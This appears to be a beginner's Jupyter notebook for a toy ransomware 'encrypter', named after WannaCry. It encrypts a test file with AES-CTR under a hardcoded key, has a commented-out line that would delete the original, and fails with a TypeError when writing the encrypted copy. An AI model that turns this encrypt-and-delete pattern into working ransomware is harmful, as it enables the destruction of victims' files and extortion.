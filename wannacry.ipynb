{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "afe480dd-d903-4a79-ac5b-a9f34384cbd3",
   "metadata": {},
   "outputs": [],
   "source": [
    "import os\n",
    "import pyaes"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "0c43ed9a-3353-4933-9379-267b39364fe0",
   "metadata": {},
   "source": [
    "## Encrypter"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "dc86c72b-d8d2-453c-b3ac-322b4fd52fa9",
   "metadata": {},
   "outputs": [],
   "source": [
    "file_name = 'test.txt'\n",
    "file = open(file_name, 'rb')\n",
    "file_data = file.read()\n",
    "file.close()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "id": "55dacfb5-f87e-4bbe-836b-4619731bc98d",
   "metadata": {},
   "outputs": [],
   "source": [
    "key = b'ransomwaretest__'\n",
    "aes = pyaes.AESModeOfOperationCTR(key)\n",
    "encrypted_data = aes.encrypt(file_data)\n",
    "#os.remove(file_name)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "id": "88658926-db9c-4d74-a4f0-8c896119e629",
   "metadata": {},
   "outputs": [
    {
     "ename": "TypeError",
     "evalue": "a bytes-like object is required, not 'int'",
     "output_type": "error",
     "traceback": [
      "\u001b[1;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[1;31mTypeError\u001b[0m                                 Traceback (most recent call last)",
      "Cell \u001b[1;32mIn[4], line 3\u001b[0m\n\u001b[0;32m      1\u001b[0m new_file \u001b[38;5;241m=\u001b[39m \u001b[38;5;124mf\u001b[39m\u001b[38;5;124m'\u001b[39m\u001b[38;5;132;01m{\u001b[39;00mfile_name\u001b[38;5;132;01m}\u001b[39;00m\u001b[38;5;124m.ransomwaretroll\u001b[39m\u001b[38;5;124m'\u001b[39m\n\u001b[0;32m      2\u001b[0m new_file \u001b[38;5;241m=\u001b[39m \u001b[38;5;28mopen\u001b[39m(new_file, \u001b[38;5;124m'\u001b[39m\u001b[38;5;124mwb\u001b[39m\u001b[38;5;124m'\u001b[39m)\n\u001b[1;32m----> 3\u001b[0m \u001b[43mnew_file\u001b[49m\u001b[38;5;241;43m.\u001b[39;49m\u001b[43mwritelines\u001b[49m\u001b[43m(\u001b[49m\u001b[43mencrypted_data\u001b[49m\u001b[43m)\u001b[49m\n\u001b[0;32m      4\u001b[0m new_file\u001b[38;5;241m.\u001b[39mclose\n",
      "\u001b[1;31mTypeError\u001b[0m: a bytes-like object is required, not 'int'"
     ]
    }
   ],
   "source": [
    "new_file = f'{file_name}.ransomwaretroll'\n",
    "new_file = open(new_file, 'wb')\n",
    "new_file.writelines(encrypted_data)\n",
    "new_file.close"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "714675b0-b47f-4dd2-9a92-7167cde402fd",
   "metadata": {},
   "outputs": [],
   "source": [
    "new_file.read()"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.12.1"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
